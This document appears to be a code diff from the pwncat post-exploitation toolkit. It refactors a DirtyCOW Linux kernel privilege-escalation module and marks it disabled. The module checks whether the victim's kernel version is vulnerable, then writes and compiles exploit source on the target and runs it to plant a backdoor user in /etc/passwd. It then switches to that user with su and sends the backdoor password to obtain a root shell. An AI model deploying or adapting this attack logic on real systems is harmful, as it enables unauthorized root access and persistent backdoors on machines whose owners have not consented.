@@ -1,33 +1,25 @@
 #!/usr/bin/env python3
 
-from typing import Generator, List
-import shlex
-import sys
-from time import sleep
-import os
-from colorama import Fore, Style
-import socket
-from io import StringIO, BytesIO
-import functools
+from typing import List
 
 import pwncat
-from pwncat.util import CTRL_C
-from pwncat.privesc.base import Method, PrivescError, Technique
-from pwncat.file import RemoteBinaryPipe
-
-from pwncat.pysudoers import Sudoers
 from pwncat import gtfobins
 from pwncat.gtfobins import Capability
-from pwncat import util
+from pwncat.privesc import BaseMethod, Technique, PrivescError
 
 
-class DirtycowMethod(Method):
+class Method_disabled(BaseMethod):
+    """
+    This method implements the DirtyCOW kernel privilege escalation exploit.
+
+    It is currently disabled as it depends on an old API.
+    """
 
     name = "dirtycow"
     BINARIES = ["cc", "uname"]
 
     def __init__(self, pty: "pwncat.pty.PtyHandler"):
-        super(DirtycowMethod, self).__init__(pty)
+        super(Method_disabled, self).__init__(pty)
         self.ran_before = False
 
     def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
@@ -37,7 +29,7 @@ class DirtycowMethod(Method):
             return []
 
         # Determine if this kernel version is vulnerable
-        kernel = self.pty.run("uname -r").decode("utf-8").strip()
+        kernel = pwncat.victim.run("uname -r").decode("utf-8").strip()
         triplet = [int(x) for x in kernel.split(".")]
         if triplet[0] > 4:
             raise PrivescError("kernel seemingly not vulnerable")
@@ -52,6 +44,8 @@ class DirtycowMethod(Method):
             raise PrivescError("kernel seemingly not vulnerable")
 
         techniques = [Technique("root", self, None, Capability.SHELL)]
+
+        return techniques
 
     def execute(self, technique: Technique):
         """ Run the specified technique """
@@ -68,32 +62,34 @@ class DirtycowMethod(Method):
 
         self.ran_before = True
 
-        writer = gtfobins.Binary.find_capability(self.pty.which, Capability.WRITE)
+        writer = gtfobins.Binary.find_capability(pwncat.victim.which, Capability.WRITE)
         if writer is None:
             raise PrivescError("no file write methods available from gtfobins")
 
-        dc_source_file = self.pty.run("mktemp").decode("utf-8").strip()
-        dc_binary = self.pty.run("mktemp").decode("utf-8").strip()
+        dc_source_file = pwncat.victim.run("mktemp").decode("utf-8").strip()
+        dc_binary = pwncat.victim.run("mktemp").decode("utf-8").strip()
 
         # Write the file
-        self.pty.run(writer.write_file(dc_source, dc_source))
+        pwncat.victim.run(writer.write_file(dc_source, dc_source))
 
         # Compile Dirtycow
-        self.pty.run(f"cc -pthread {dc_source_file} -o {dc_binary} -lcrypt")
+        pwncat.victim.run(f"cc -pthread {dc_source_file} -o {dc_binary} -lcrypt")
 
         # Run Dirtycow
-        self.pty.run(dc_binary)
+        pwncat.victim.run(dc_binary)
 
         # Reload /etc/passwd
-        self.pty.reload_users()
+        pwncat.victim.reload_users()
 
-        if self.pty.privesc.backdoor_user_name not in self.pty.users:
+        if pwncat.victim.privesc.backdoor_user_name not in pwncat.victim.users:
             raise PrivescError("backdoor user not created")
 
         # Become the new user!
-        self.pty.run(f"su {self.pty.privesc.backdoor_user_name}", wait=False)
-        self.pty.recvuntil(": ")
+        pwncat.victim.run(f"su {pwncat.victim.privesc.backdoor_user_name}", wait=False)
+        pwncat.victim.recvuntil(": ")
 
-        self.pty.client.send(self.pty.privesc.backdoor_password.encode("utf-8") + b"\n")
+        pwncat.victim.client.send(
+            pwncat.victim.privesc.backdoor_password.encode("utf-8") + b"\n"
+        )
 
         return "exit"
